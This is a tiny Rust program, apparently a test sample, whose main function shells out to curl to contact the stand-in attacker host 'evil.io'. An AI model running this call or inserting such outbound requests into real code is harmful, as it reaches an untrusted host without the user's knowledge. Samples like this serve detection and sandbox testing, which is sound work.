fn main() {
    std::process::Command::new("curl").arg("evil.io").output().unwrap();
}
